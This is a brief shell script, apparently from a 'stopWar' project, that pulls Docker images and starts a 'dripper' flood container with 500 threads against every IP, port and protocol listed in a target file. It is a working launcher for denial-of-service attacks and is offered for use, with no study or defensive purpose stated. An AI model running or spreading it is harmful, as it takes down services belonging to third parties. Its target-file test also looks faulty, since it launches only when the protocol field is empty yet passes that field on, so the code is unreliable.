#!/bin/sh

cd /root/stopWar

[ -f docker.list ] && cat docker.list | xargs docker rm -f && cat /dev/null > docker.list

/usr/bin/docker pull cherniavsky94/stop-war

cat target | while read ip port proto
do
    if [ ! X$ip = X -a ! X$port = X -a X$proto = X ] 
    then
	/usr/bin/docker run -d alexmon1989/dripper:1.1.1 -s $ip -p $port -t 500 -m $proto >> docker.list
    fi
done

